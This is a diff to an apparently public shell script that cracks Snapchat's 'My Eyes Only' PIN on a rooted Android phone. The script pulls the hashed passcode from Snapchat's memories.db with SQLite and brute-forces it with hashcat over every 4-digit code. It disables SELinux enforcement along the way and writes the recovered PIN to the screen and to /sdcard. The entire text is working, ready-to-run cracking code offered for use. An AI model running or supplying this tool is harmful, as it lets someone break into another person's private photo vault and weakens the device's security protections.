@@ -139,18 +139,14 @@ if [ "$(su -c 'getenforce 2>/dev/null')" = "Enforcing" ]; then
 else
   package=$(su -c "pm list packages | grep 'com.snapchat.android'" 2>/dev/null)  # SnapChat packages list
 fi
-meo="$HOME/meo"  # meo dir inside Termux $HOME dir
 installedPKG=$(pkg list-installed 2>/dev/null)  # list of installed pkg
 pkg update > /dev/null 2>&1  # It downloads latest package list with versions from Termux remote repository, then compares them to local (installed) pkg versions, and shows a list of what can be upgraded if they are different.
 outdatedPKG=$(apt list --upgradable 2>/dev/null)  # list of outdated pkg
 echo "$outdatedPKG" | grep -q "dpkg was interrupted" 2>/dev/null && { yes "N" | dpkg --configure -a; outdatedPKG=$(apt list --upgradable 2>/dev/null); }
 arch=$(getprop ro.product.cpu.abi)  # get device arch
 model=$(getprop ro.product.model)  # get device model
-hashed_passcode_file="$meo/hashed_passcode.txt"  # hashed_passcode.txt file
-potfile="/root/hashcat.potfile"  # Hashcat potfile variable
-
-# --- Create $meo dir if it does't exist ---
-mkdir -p "$meo"
+hashes="$HOME/hashes.txt"  # hashes.txt file
+potfile="/root/.local/share/hashcat/hashcat.potfile"  # Hashcat potfile variable
 
 # --- pkg upgrade function ---
 pkgUpdate() {
@@ -328,8 +324,9 @@ fi
 
 # --- Update Ubuntu ---
 if ls "$PREFIX/var/lib/proot-distro/installed-rootfs/" 2>/dev/null | grep -iq "ubuntu"; then
-  echo -e "$running Updating Ubuntu distribution.."
-  proot-distro login ubuntu -- bash -c "export DEBIAN_FRONTEND=noninteractive && { apt update && apt upgrade -y; } > /dev/null 2>&1"
+  #echo -e "$running Updating Ubuntu distribution.."
+  #proot-distro login ubuntu -- bash -c "export DEBIAN_FRONTEND=noninteractive && { apt update && apt upgrade -y; } > /dev/null 2>&1"
+  proot-distro login ubuntu -- bash -c "export DEBIAN_FRONTEND=noninteractive && { apt update && apt install --only-upgrade apt libc6 libssl3t64 libgnutls30t64 openssl -y; } > /dev/null 2>&1"
 fi
 
 # --- Install Hashcat ---
@@ -437,30 +434,18 @@ tryMEO() {
 
 # --- Get the hashed PassCode ---
 if su -c "ls -l /data/data/com.snapchat.android/databases/memories.db" >/dev/null 2>&1; then
-  hashed_passcode=$(su -c "/data/data/com.snapchat.android/sqlite /data/data/com.snapchat.android/databases/memories.db 'select hashed_passcode from memories_meo_confidential;'")
+  su -c "/data/data/com.snapchat.android/sqlite /data/data/com.snapchat.android/databases/memories.db 'select hashed_passcode from memories_meo_confidential;'" > "$hashes"
   #  --- check if $hashed_passcode is null ---
-  if [ -z $hashed_passcode ]; then
+  if [ -z $(cat $hashes) ]; then
     echo -e "$bad Failed to fetched hashed PassCode using SQLite."
     termux-open-url "https://github.com/arghya339/IntelliJ-MyEyes/blob/main/docs%2Fhashed_passcode_null_error.md"  # open hashed_passcode_null_error docs if fetched hashed passcode is null
     exit 1  # Terminate script execution
   else
     echo -e "\033[1;30;47m[####] Fetched hashed PassCode: [$hashed_passcode]\033[0m"
-    # --- Save the hashed passcode into a .txt file ---
-    echo "$hashed_passcode" > "$hashed_passcode_file"
   fi
-
-  # Hashcat stores cracked hashes in a file called a $potfile, Removing the $potfile ensures the results are freshly computed for each execution.
-
-  if [ -f $potfile ]; then
-    proot-distro login ubuntu -- bash -c "rm -rf $potfile"
-  fi
-  # proot-distro login ubuntu -- bash -c " touch $potfile"  # create $potfile file
   
-  # which hashcat || whereis hashcat  # get hashcat executable path, its located in root@localhost:/usr/bin# dir
-
   # --- Brute-force the hash ---
   echo -e "$running Brute forcing hash using HashCat.."
-  # echo "$HOME/meo/hashed_passcode.txt file content:" && proot-distro login ubuntu -- /bin/bash -c "cat $hashed_passcode_file"
   if [ "$(su -c 'getenforce 2>/dev/null')" = "Enforcing" ]; then
     su -c "setenforce 0"  # set SELinux to Permissive mode to unblock unauthorized operations
     su -c "cmd deviceidle whitelist +com.termux" &> /dev/null
@@ -469,17 +454,13 @@ if su -c "ls -l /data/data/com.snapchat.android/databases/memories.db" >/dev/nul
     su -c "cmd deviceidle whitelist +com.termux" &> /dev/null
   fi
   termux-wake-lock
-  proot-distro login ubuntu -- /bin/bash -c "hashcat -m 3200 -a 3 '$hashed_passcode_file' '?d?d?d?d' --potfile-disable --force -o '$potfile' > /dev/null 2>&1"
+  pincode=$(proot-distro login ubuntu -- /bin/bash -c "hashcat -m 3200 -a 3 $hashes ?d?d?d?d --potfile-disable --restore-disable --force --quiet" 2>/dev/null | awk -F: '{print $2}')
+  [ -z "$pincode" ] && pincode=$(> /sdcard/MEO.txt; proot-distro login ubuntu -- /bin/bash -c "hashcat -m 3200 -a 3 $hashes ?d?d?d?d --potfile-path=$potfile --force --quiet && { hashcat -m 3200 -a 3 $hashes ?d?d?d?d --show -o /sdcard/MEO.txt; rm -f $potfile; }" 2>/dev/null | cut -d: -f2)
   termux-wake-unlock
-  # using --potfile-disable flag to Temporarily ignore the potfile for the current session becouse i dont know hashcat default potfile path
-  # ---  Check Previously Cracked Hashes ---
-  # proot-distro login ubuntu -- /bin/bash -c "hashcat --show -m 3200 '$hashed_passcode_file'"
-
-  # --- Extract pincode from potfile ---
-  pincode=$(proot-distro login ubuntu -- /bin/bash -c "grep -o '[^:]*$' '$potfile' | tail -n1" 2>/dev/null)
-
+  
   # --- Validate and display result ---
   if [ ${#pincode} -eq 4 ]; then
+    rm -f "$hashes"
     echo -e "\033[1;92;47m[****] Cracked My Eyes Only PinCode: [$pincode]\033[0m"
     
     if [ "$(su -c 'getenforce 2>/dev/null')" = "Enforcing" ]; then
@@ -490,7 +471,7 @@ if su -c "ls -l /data/data/com.snapchat.android/databases/memories.db" >/dev/nul
       tryMEO
     fi
     
-    echo -e "${Green}☆ Star & -{ Fork me..${Reset}"
+    echo -e "${Green}Star & Fork me on GitHub..${Reset}"
     # Open GitHub URL
     termux-open-url "https://github.com/arghya339/IntelliJ-MyEyes"
     sleep 0.5  # 0.5 seconds = 500 milliseconds
